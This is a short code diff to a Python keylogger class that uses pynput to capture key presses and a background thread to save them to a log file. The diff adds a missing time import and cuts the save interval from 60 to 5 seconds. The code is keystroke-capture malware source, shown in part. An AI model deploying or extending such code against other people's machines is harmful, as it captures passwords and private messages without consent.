@@ -1,12 +1,12 @@
 import pynput.keyboard as keyboard
 import threading
+import time
 
 class Keylogger:
     def __init__(self, log_file):
         self.log_file = log_file
         self.log = ""
         self.listener = keyboard.Listener(on_press=self.on_key_press)
-        
         # Start a thread to save logs periodically
         self.log_thread = threading.Thread(target=self.save_log_periodically)
         self.log_thread.daemon = True
@@ -31,7 +31,7 @@ class Keylogger:
     def save_log_periodically(self):
         while True:
             self.save_log()
-            time.sleep(60)  # Save every 60 seconds
+            time.sleep(5)  # Save every 5 seconds
 
     def start(self):
         with self.listener:
